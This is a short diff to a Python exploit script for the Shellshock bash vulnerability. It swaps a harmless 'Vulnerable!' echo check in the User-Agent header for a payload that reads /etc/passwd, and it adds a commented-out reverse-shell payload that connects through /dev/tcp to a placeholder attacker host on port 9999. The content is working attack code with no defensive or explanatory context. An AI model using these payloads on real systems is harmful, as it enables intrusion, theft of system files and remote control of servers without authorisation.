@@ -20,7 +20,8 @@ def main():
 
     # Send the request
     conn = http.client.HTTPSConnection(parsed_url.hostname)
-    headers = { "User-Agent": "() { :; }; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo; echo 'Vulnerable!'" }
+    headers = { "User-Agent": "() { :; }; echo ; echo ; /bin/cat /etc/passwd' bash -s :" }
+    # headers = { "User-Agent": "() { :; }; /bin/bash -i >& /dev/tcp/attackerip/9999 0>&1" }
     conn.request("GET", parsed_url.path, headers=headers)
     resp = conn.getresponse()
     conn.close()
